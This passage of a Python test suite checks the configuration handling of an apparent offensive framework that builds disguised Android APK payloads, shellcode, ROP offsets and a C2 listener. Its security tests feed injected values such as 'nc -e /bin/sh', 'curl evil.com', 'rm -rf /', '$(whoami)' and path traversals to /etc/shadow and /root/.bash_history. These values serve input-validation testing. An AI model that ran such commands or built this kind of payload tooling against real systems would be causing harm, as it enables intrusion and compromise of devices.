        unexpected=["Traceback", "Exception:"]
    )

    # 117. Verify TLS Socket Helper
    auditor.register_test(
        name="Payload Service: TLS Helper",
        commands=["set ANDROID_PAYLOAD_TYPE drs"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 118. Security: Injection via App Name
    auditor.register_test(
        name="Security: App Name Shell Injection",
        commands=["set APP_NAME \"System Update\"; echo 'Hacked'"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 119. Verify C2 Port Fallback
    auditor.register_test(
        name="C2 Port Fallback Validation",
        commands=["set L_PORT \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 120. Verify Full Cleanup
    auditor.register_test(
        name="Full Workspace Cleanup",
        commands=["clean"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # =================================================================
    # PAYLOAD GENERATION: KIVY APK PIPELINE (121 - 140)
    # =================================================================

    # 121. Kivy: Set Payload Type
    auditor.register_test(
        name="Kivy Pipeline: Set Payload Type",
        commands=["set KIVY_PAYLOAD_TYPE reverse_tcp", "show"],
        expected=["reverse_tcp"],
        unexpected=["Traceback", "Exception:"]
    )

    # 122. Kivy: Set App Version
    auditor.register_test(
        name="Kivy Pipeline: Set App Version",
        commands=["set APP_VERSION 2.0.1", "show"],
        expected=["2.0.1"],
        unexpected=["Traceback", "Exception:"]
    )

    # 123. Kivy: Set Icon Path
    auditor.register_test(
        name="Kivy Pipeline: Set Icon Path",
        commands=["set ICON_PATH /opt/assets/icon.png", "show"],
        expected=["/opt/assets/icon.png"],
        unexpected=["Traceback", "Exception:"]
    )

    # 124. Kivy: Set Package Domain
    auditor.register_test(
        name="Kivy Pipeline: Set Package Domain",
        commands=["set PACKAGE_DOMAIN com.supersploit.app", "show"],
        expected=["com.supersploit.app"],
        unexpected=["Traceback", "Exception:"]
    )

    # 125. Kivy: Set App Permissions
    auditor.register_test(
        name="Kivy Pipeline: Set Permissions",
        commands=["set APP_PERMISSIONS INTERNET,WAKELOCK", "show"],
        expected=["INTERNET,WAKELOCK"],
        unexpected=["Traceback", "Exception:"]
    )

    # 126. Kivy: Toggle Fullscreen
    auditor.register_test(
        name="Kivy Pipeline: Toggle Fullscreen",
        commands=["set FULLSCREEN true", "show"],
        expected=["true"],
        unexpected=["Traceback", "Exception:"]
    )

    # 127. Kivy: Set Orientation
    auditor.register_test(
        name="Kivy Pipeline: Set Orientation",
        commands=["set ORIENTATION portrait", "show"],
        expected=["portrait"],
        unexpected=["Traceback", "Exception:"]
    )

    # 128. Edge Case: Missing Kivy Icon
    auditor.register_test(
        name="Edge Case: Missing Kivy Icon Path",
        commands=["set ICON_PATH \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 129. Edge Case: Invalid App Version Format
    auditor.register_test(
        name="Edge Case: Invalid Kivy App Version",
        commands=["set APP_VERSION V_XYZ_ALPHA"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 130. Edge Case: Special Chars in Package Domain
    auditor.register_test(
        name="Edge Case: Special Chars in Package Domain",
        commands=["set PACKAGE_DOMAIN com.test!@#.domain"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 131. Edge Case: Empty Permissions List
    auditor.register_test(
        name="Edge Case: Empty Kivy Permissions",
        commands=["set APP_PERMISSIONS \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 132. Edge Case: Extreme App Name Length
    auditor.register_test(
        name="Edge Case: Extreme Kivy App Name Length",
        commands=["set APP_NAME " + "A" * 500],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 133. Security: Kivy Icon Path Traversal
    auditor.register_test(
        name="Security: Kivy Icon Path Traversal",
        commands=["set ICON_PATH ../../../../etc/passwd"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 134. Security: Command Injection in App Version
    auditor.register_test(
        name="Security: Kivy App Version Command Injection",
        commands=["set APP_VERSION 1.0; whoami"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 135. Security: Shell Metachars in Permissions
    auditor.register_test(
        name="Security: Kivy Permissions Metacharacters",
        commands=["set APP_PERMISSIONS INTERNET|cat /etc/passwd"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 136. Kivy: Set Build Mode
    auditor.register_test(
        name="Kivy Pipeline: Set Build Mode",
        commands=["set BUILD_MODE release"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 137. Edge Case: Invalid Build Mode
    auditor.register_test(
        name="Edge Case: Invalid Kivy Build Mode",
        commands=["set BUILD_MODE quantum_mode"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 138. Kivy: Toggle Splash Screen
    auditor.register_test(
        name="Kivy Pipeline: Toggle Splash Screen",
        commands=["set SPLASH_SCREEN false"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 139. Kivy: Set Additional Requirements
    auditor.register_test(
        name="Kivy Pipeline: Set Requirements",
        commands=["set REQUIREMENTS sqlite3,requests"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 140. Security: Injection in Requirements
    auditor.register_test(
        name="Security: Kivy Requirements Shell Injection",
        commands=["set REQUIREMENTS requests; rm -rf /"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # =================================================================
    # PAYLOAD GENERATION: NATIVE APK PIPELINE (141 - 160)
    # =================================================================

    # 141. Native: Set NDK Toolchain Path
    auditor.register_test(
        name="Native Pipeline: Set NDK Path",
        commands=["set NDK_PATH /opt/android-ndk/"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 142. Native: Set Target ABI Filters
    auditor.register_test(
        name="Native Pipeline: Set ABI Filters",
        commands=["set ABI_FILTERS arm64-v8a,armeabi-v7a"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 143. Native: Set Minimum SDK Version
    auditor.register_test(
        name="Native Pipeline: Set Minimum SDK",
        commands=["set MIN_SDK 24"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 144. Native: Set Target SDK Version
    auditor.register_test(
        name="Native Pipeline: Set Target SDK",
        commands=["set TARGET_SDK 33"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 145. Native: Toggle Code Obfuscation
    auditor.register_test(
        name="Native Pipeline: Toggle Obfuscation",
        commands=["set OBFUSCATION_LEVEL high"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 146. Native: Toggle Symbol Stripping
    auditor.register_test(
        name="Native Pipeline: Toggle Symbol Stripping",
        commands=["set STRIP_SYMBOLS true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 147. Native: Set Custom Keystore Path
    auditor.register_test(
        name="Native Pipeline: Set Custom Keystore",
        commands=["set KEYSTORE_PATH ~/.android/debug.keystore"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 148. Native: Set Keystore Password
    auditor.register_test(
        name="Native Pipeline: Set Keystore Password",
        commands=["set KEYSTORE_PASS android"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 149. Edge Case: Non-existent NDK Path
    auditor.register_test(
        name="Edge Case: Invalid NDK Toolchain Path",
        commands=["set NDK_PATH /fake/path/ndk"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 150. Edge Case: Invalid ABI Filter
    auditor.register_test(
        name="Edge Case: Invalid ABI Architecture",
        commands=["set ABI_FILTERS mips64_fake"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 151. Edge Case: Negative Min SDK
    auditor.register_test(
        name="Edge Case: Negative Minimum SDK",
        commands=["set MIN_SDK -5"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 152. Edge Case: Min SDK > Target SDK
    auditor.register_test(
        name="Edge Case: Min SDK Greater Than Target",
        commands=["set MIN_SDK 33", "set TARGET_SDK 24"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 153. Edge Case: Missing Keystore
    auditor.register_test(
        name="Edge Case: Missing Keystore Assignment",
        commands=["set KEYSTORE_PATH \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 154. Security: Keystore Path Traversal
    auditor.register_test(
        name="Security: Keystore Path Traversal",
        commands=["set KEYSTORE_PATH ../../../secret.keystore"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 155. Security: Command Injection in ABI Filters
    auditor.register_test(
        name="Security: ABI Filters Command Injection",
        commands=["set ABI_FILTERS arm64-v8a; ls -la"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 156. Security: Shell Metachars in Keystore Pass
    auditor.register_test(
        name="Security: Keystore Pass Metacharacters",
        commands=["set KEYSTORE_PASS password$(whoami)"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 157. Native: Setup Payload Stub
    auditor.register_test(
        name="Native Pipeline: Set Payload Stub",
        commands=["set NATIVE_STUB native_drs.c"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 158. Edge Case: Missing Payload Stub
    auditor.register_test(
        name="Edge Case: Missing Native Stub Config",
        commands=["set NATIVE_STUB \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 159. Native: Set Native Build Tool
    auditor.register_test(
        name="Native Pipeline: Set Build Tool",
        commands=["set BUILD_TOOL clang"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 160. Security: Injection in Build Tool
    auditor.register_test(
        name="Security: Build Tool Command Injection",
        commands=["set BUILD_TOOL clang; curl evil.com"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # =================================================================
    # PAYLOAD GENERATION: SHELLCODE GENERATOR (161 - 180)
    # =================================================================

    # 161. Shellcode: Set Architecture
    auditor.register_test(
        name="Shellcode Gen: Set Architecture",
        commands=["set SHELLCODE_ARCH x86_64"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 162. Shellcode: Set Bad Characters
    auditor.register_test(
        name="Shellcode Gen: Set Bad Characters",
        commands=["set BAD_CHARS \"\\x00\\x0a\\x0d\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 163. Shellcode: Set Encoder
    auditor.register_test(
        name="Shellcode Gen: Set Encoder",
        commands=["set ENCODER shikata_ga_nai"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 164. Shellcode: Set Output Format
    auditor.register_test(
        name="Shellcode Gen: Set Output Format",
        commands=["set SC_FORMAT c_array"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 165. Shellcode: Set NOP Sled Size
    auditor.register_test(
        name="Shellcode Gen: Set NOP Sled",
        commands=["set NOP_SLED_SIZE 32"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 166. Shellcode: Set Exit Function
    auditor.register_test(
        name="Shellcode Gen: Set Exit Function",
        commands=["set EXIT_FUNC thread"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 167. Edge Case: Invalid Architecture
    auditor.register_test(
        name="Edge Case: Invalid Shellcode Arch",
        commands=["set SHELLCODE_ARCH 128_bit_fake"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 168. Edge Case: Malformed Bad Characters
    auditor.register_test(
        name="Edge Case: Malformed Bad Characters",
        commands=["set BAD_CHARS ZZZZ"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 169. Edge Case: Unknown Encoder
    auditor.register_test(
        name="Edge Case: Unknown Shellcode Encoder",
        commands=["set ENCODER magic_encoder_99"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 170. Edge Case: Invalid Output Format
    auditor.register_test(
        name="Edge Case: Invalid SC Output Format",
        commands=["set SC_FORMAT pdf_doc"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 171. Edge Case: Negative NOP Sled Size
    auditor.register_test(
        name="Edge Case: Negative NOP Sled Size",
        commands=["set NOP_SLED_SIZE -16"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 172. Edge Case: Extreme NOP Sled Size
    auditor.register_test(
        name="Edge Case: Extreme NOP Sled Length",
        commands=["set NOP_SLED_SIZE 999999999"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 173. Edge Case: Invalid Exit Function
    auditor.register_test(
        name="Edge Case: Invalid Exit Function",
        commands=["set EXIT_FUNC crash_and_burn"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 174. Security: Command Injection in Encoder
    auditor.register_test(
        name="Security: Shellcode Encoder Command Injection",
        commands=["set ENCODER xor; /bin/sh"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 175. Security: Shell Metachars in Output Format
    auditor.register_test(
        name="Security: SC Format Metacharacters",
        commands=["set SC_FORMAT c_array$(id)"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 176. Shellcode: Setup Assembly Source Path
    auditor.register_test(
        name="Shellcode Gen: Set ASM Source",
        commands=["set ASM_SOURCE payloads/custom.s"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 177. Edge Case: Missing Assembly Source
    auditor.register_test(
        name="Edge Case: Missing ASM Source",
        commands=["set ASM_SOURCE \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 178. Security: Assembly Source Path Traversal
    auditor.register_test(
        name="Security: ASM Source Path Traversal",
        commands=["set ASM_SOURCE ../../../../etc/shadow"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 179. Shellcode: Toggle Polymorphism
    auditor.register_test(
        name="Shellcode Gen: Toggle Polymorphism",
        commands=["set POLYMORPHIC true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 180. Shellcode: Set Custom Base Address
    auditor.register_test(
        name="Shellcode Gen: Set Custom SC Base",
        commands=["set SC_BASE_ADDR 0x08048000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # =================================================================
    # PAYLOAD GENERATION: KASLR/ASLR CALCULATOR (181 - 200)
    # =================================================================

    # 181. KASLR: Set Target Base Address
    auditor.register_test(
        name="KASLR Calc: Set Base Address",
        commands=["set BASE_ADDR 0x7ffff7a0d000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 182. KASLR: Set Leaked Address
    auditor.register_test(
        name="KASLR Calc: Set Leaked Address",
        commands=["set LEAK_ADDR 0x7ffff7a5b000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 183. KASLR: Set Target Offset
    auditor.register_test(
        name="KASLR Calc: Set Target Offset",
        commands=["set TARGET_OFFSET 0x4e000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 184. KASLR: Set Target Libc Version
    auditor.register_test(
        name="KASLR Calc: Set Libc Version",
        commands=["set LIBC_VERSION libc6_2.31-13+deb11u5_amd64"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 185. KASLR: Set Gadget Name
    auditor.register_test(
        name="KASLR Calc: Set Gadget Search",
        commands=["set GADGET pop_rdi_ret"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 186. Edge Case: Invalid Hex Base Address
    auditor.register_test(
        name="Edge Case: Invalid Hex Base Address",
        commands=["set BASE_ADDR 0xXYZ123"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 187. Edge Case: Invalid Hex Leaked Address
    auditor.register_test(
        name="Edge Case: Invalid Hex Leak Address",
        commands=["set LEAK_ADDR fake_address"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 188. Edge Case: Negative Offset
    auditor.register_test(
        name="Edge Case: Negative KASLR Offset",
        commands=["set TARGET_OFFSET -0x1000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 189. Edge Case: Out of Bounds Address Space
    auditor.register_test(
        name="Edge Case: Out of Bounds Address Math",
        commands=["set BASE_ADDR 0xffffffffffffffff"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 190. Edge Case: Missing Libc Version
    auditor.register_test(
        name="Edge Case: Missing Libc Identifier",
        commands=["set LIBC_VERSION \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 191. Security: Command Injection in Gadget Name
    auditor.register_test(
        name="Security: Gadget Name Command Injection",
        commands=["set GADGET pop_rdi; uname -a"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 192. Security: Shell Metachars in Libc Path
    auditor.register_test(
        name="Security: Libc Path Metacharacters",
        commands=["set LIBC_VERSION /lib/`whoami`"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 193. KASLR: Set Custom System Offset
    auditor.register_test(
        name="KASLR Calc: Set System Offset",
        commands=["set SYSTEM_OFFSET 0x55410"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 194. Edge Case: Missing Leak Address
    auditor.register_test(
        name="Edge Case: Missing Leak for Calc",
        commands=["set LEAK_ADDR \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 195. KASLR: Set ROP Output Format
    auditor.register_test(
        name="KASLR Calc: Set ROP Format",
        commands=["set ROP_FORMAT python_struct"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 196. Edge Case: Invalid ROP Format
    auditor.register_test(
        name="Edge Case: Invalid ROP Format Type",
        commands=["set ROP_FORMAT binary_dump"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 197. KASLR: Load Custom ROP Gadget File
    auditor.register_test(
        name="KASLR Calc: Set Custom Gadget File",
        commands=["set GADGET_FILE gadgets.txt"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 198. Security: Gadget File Path Traversal
    auditor.register_test(
        name="Security: Gadget File Path Traversal",
        commands=["set GADGET_FILE ../../../../root/.bash_history"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 199. KASLR: Set Stack Pivot Offset
    auditor.register_test(
        name="KASLR Calc: Set Stack Pivot",
        commands=["set PIVOT_OFFSET 0x89abcdef"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 200. Edge Case: Invalid Stack Pivot Value
    auditor.register_test(
        name="Edge Case: Invalid Stack Pivot Base",
        commands=["set PIVOT_OFFSET bad_hex_value"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # =================================================================
    # C2 LISTENER INTEGRATION (201 - 220)
    # =================================================================

    # 201. C2: Set Bind IP
    auditor.register_test(
        name="C2 Listener: Set Bind IP",
        commands=["set BIND_IP 0.0.0.0"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 202. C2: Set Bind Port
    auditor.register_test(
        name="C2 Listener: Set Bind Port",
        commands=["set BIND_PORT 4444"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 203. C2: Set SSL Certificate
    auditor.register_test(
        name="C2 Listener: Set SSL Certificate",
        commands=["set SSL_CERT /opt/certs/server.crt"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 204. C2: Set SSL Private Key
    auditor.register_test(
        name="C2 Listener: Set SSL Private Key",
        commands=["set SSL_KEY /opt/certs/server.key"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 205. C2: Set Session Timeout
    auditor.register_test(
        name="C2 Listener: Set Session Timeout",
        commands=["set SESSION_TIMEOUT 300"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 206. C2: Set Heartbeat Interval
    auditor.register_test(
        name="C2 Listener: Set Heartbeat Interval",
        commands=["set HEARTBEAT 15"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 207. C2: Toggle Auto-Kill Dead Sessions
    auditor.register_test(
        name="C2 Listener: Toggle Auto-Kill",
        commands=["set AUTO_KILL true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 208. Edge Case: Invalid Bind IP
    auditor.register_test(
        name="Edge Case: Invalid C2 Bind IP",
        commands=["set BIND_IP 999.999.999.999"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 209. Edge Case: Out of Bounds Bind Port
    auditor.register_test(
        name="Edge Case: C2 Port Out of Bounds",
        commands=["set BIND_PORT 80000"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 210. Edge Case: Privileged Bind Port without Root
    auditor.register_test(
        name="Edge Case: C2 Privileged Port Binding",
        commands=["set BIND_PORT 21"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 211. Edge Case: Missing SSL Certificate
    auditor.register_test(
        name="Edge Case: Missing C2 SSL Cert",
        commands=["set SSL_CERT \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 212. Edge Case: Missing SSL Key
    auditor.register_test(
        name="Edge Case: Missing C2 SSL Key",
        commands=["set SSL_KEY \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 213. Edge Case: Negative Session Timeout
    auditor.register_test(
        name="Edge Case: Negative Session Timeout",
        commands=["set SESSION_TIMEOUT -100"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 214. Edge Case: Negative Heartbeat Interval
    auditor.register_test(
        name="Edge Case: Negative Heartbeat Interval",
        commands=["set HEARTBEAT -5"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 215. Security: Command Injection in Bind IP
    auditor.register_test(
        name="Security: C2 Bind IP Command Injection",
        commands=["set BIND_IP 127.0.0.1; nc -e /bin/sh"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 216. Security: SSL Cert Path Traversal
    auditor.register_test(
        name="Security: SSL Cert Path Traversal",
        commands=["set SSL_CERT ../../../etc/ssl/certs/root.pem"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 217. C2: Toggle Listener Output Stderr
    auditor.register_test(
        name="C2 Listener: Toggle Stderr Logging",
        commands=["set C2_DEBUG true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 218. Edge Case: Corrupt SSL Handshake Config
    auditor.register_test(
        name="Edge Case: Corrupt C2 SSL Config",
        commands=["set SSL_CIPHERS NULL-MD5"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 219. Edge Case: Zero Heartbeat Interval
    auditor.register_test(
        name="Edge Case: Zero C2 Heartbeat Config",
        commands=["set HEARTBEAT 0"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 220. Security: C2 Alias Metacharacters
    auditor.register_test(
        name="Security: C2 Listener Alias Metacharacters",
        commands=["set LISTENER_NAME pwn_listener`id`"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # Execute the Audit Suite
    auditor.audit()
